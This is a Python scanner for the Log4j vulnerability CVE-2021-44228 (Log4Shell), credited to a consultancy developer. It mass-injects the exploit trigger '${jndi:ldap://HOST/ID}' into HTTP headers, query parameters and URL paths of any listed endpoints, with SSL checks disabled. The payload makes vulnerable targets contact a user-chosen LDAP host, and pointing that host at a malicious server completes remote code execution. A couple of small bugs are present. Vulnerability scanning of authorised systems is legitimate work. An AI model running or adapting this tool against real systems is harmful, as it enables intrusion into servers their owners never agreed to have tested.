import argparse
import uuid
from termcolor import cprint
import requests
from urllib import parse

# Disable insecure SSL warning
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TESTING_HOST = "localhost:1389"
TESTING_PAYLOAD = "${jndi:ldap://HOST/ID}"
OUTPUT_FILE = "ids.csv"
HEADERS = [
    "user-agent",
    "X-Api-Version",
    "referer",
    "x-forwarded-for"
]


def get_arguments():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--filename",
                       action="store",
                       dest="filename",
                       help="file to use as a source of endpoints (format IP:PORT)")
    group.add_argument("-e", "--endpoint",
                       action="store",
                       dest="endpoint",
                       help="endpoint to test")
    parser.add_argument("--http",
                        action="store_true",
                        help="Test HTTP schema")
    parser.add_argument("--https",
                        action="store_true",
                        help="Test HTTPS schema")
    parser.add_argument("-p", "--payload",
                        action="store",
                        default=TESTING_PAYLOAD,
                        help="template of the testing payload to use")
    parser.add_argument("--host",
                        action="store",
                        default=TESTING_HOST,
                        dest="host",
                        help="host to replace in the HOST placeholder in the payload template")
    parser.add_argument("-o", "--output",
                        action="store",
                        default=OUTPUT_FILE,
                        help="output file on which will be saved the endpoint-ID mappings",
                        dest="output")
    parser.add_argument("-t", "--timeout",
                        action="store",
                        default=10,
                        help="request timeout",
                        dest="timeout",
                        type=int)
    parser.add_argument("-v", "--verbose",
                        action="store_true",
                        dest="verbose",
                        help="verbose logging")
    parser.add_argument("--headers-file",
                        action="store",
                        dest="headers",
                        help="file with a list of header to test")
    test_group = parser.add_argument_group("Tests", "[default: Headers, Query, Path]")
    test_group.add_argument("--headers",
                            action="append_const",
                            dest="tests",
                            const="Headers",
                            help="test headers injection like user-agent and referer, default is ids.csv")
    test_group.add_argument("--query",
                            action="append_const",
                            dest="tests",
                            const="Query",
                            help="test query injection in GET request as id parameter")
    test_group.add_argument("--path",
                            action="append_const",
                            dest="tests",
                            const="Path",
                            help="test path injection")
    args = parser.parse_args()
    if args.tests is None:
        args.tests = ["Headers", "Query", "Path"]
    return args


def read_file_rows(file):
    rows = []
    with open(file, "r") as f:
        for i in f.readlines():
            i = i.strip()
            if i == "" or i.startswith("#"):
                continue
            rows.append(i)
    return rows


def get_entries(filename):
    with open(filename) as file:
        lines = file.readlines()
        lines = [line.rstrip() for line in lines]
        return lines


def build_testing_payload(id, host, payload):
    return payload.replace("HOST", host).replace("ID", id)


def generate_endpoint_id(endpoint):
    return uuid.uuid4().hex


def generate_mappings(endpoints):
    return [(endpoint, generate_endpoint_id(endpoint)) for endpoint in endpoints]


def test_entry(endpoint, payload, id, args):
    cprint(f"[*] [ID: {id}] Testing endpoint {endpoint}", "green")
    if args.verbose:
        cprint(f" [%] Payload: {testing_payload}", color="cyan")
    for test_key, test_fun in TESTS_LIST:
        try:
            test_fun(endpoint, payload, args)
        except Exception as e:
            cprint(f" [!] [{test_key}] Test failed with: {e}", color="red")


def get_endpoints_from_entries(entries, http, https):
    endpoints = []
    for entry in entries:
        if entry.startswith("http://") or entry.startswith("https://"):
            endpoints.append(entry)
            break

        if http:
            endpoints.append("http://" + entry)
        if https:
            endpoints.append("https://" + entry)
        if not http and not https:
            endpoints.append("http://" + entry)
            endpoints.append("https://" + entry)
    return endpoints


def log_mappings(mappings):
    cprint(f"[*] Endpoint-ID mapping (exported in {OUTPUT_FILE}):", color="cyan", attrs=["bold", "underline"])
    for endpoint, id in mappings:
        cprint(f" - {endpoint} -> {id}", color="white")


def generate_mapping_file(mappings, output):
    with open(output, "w") as f:
        f.writelines([f"{id},{endpoint}\n" for endpoint, id in mappings])


# Tests
def test_header(endpoint, payload, args):
    if args.headers is not None:
        headers = read_file_rows(args.headers)
    else:
        headers = HEADERS

    headers = {header: payload for header in headers}
    requests.get(endpoint, headers=headers, verify=False, timeout=args.timeout)


def test_get(endpoint, payload, args):
    params = {"id": payload}
    requests.get(endpoint, params=params, verify=False, timeout=args.timeout)


def test_path(endpoint, payload, args):
    url = parse.urljoin(endpoint, parse.quote(payload, safe=''))
    requests.get(url, verify=False, timeout=args.timeout)


TESTS_LIST = [("Headers", test_header),
              ("Query", test_get),
              ("Path", test_path)]


# MAIN
if __name__ == '__main__':
    args = get_arguments()
    cprint("[*] CVE-2021-44228 - Apache Log4j RCE Scanner", color="yellow")
    cprint("[*] Developed by Federico Rapetti for Reply Communication Valley", color="yellow")
    print()
    if args.filename is not None:
        entries = get_entries(args.filename)
    else:
        entries = [args.endpoint]
    mappings = generate_mappings(get_endpoints_from_entries(entries, args.http, args.https))
    log_mappings(mappings)
    generate_mapping_file(mappings, args.output)
    print("")

    cprint("[*] Start testing", color="magenta", attrs=["bold", "underline"])
    for endpoint, id in mappings:
        testing_payload = build_testing_payload(id, args.host, args.payload)
        test_entry(endpoint, testing_payload, id, args)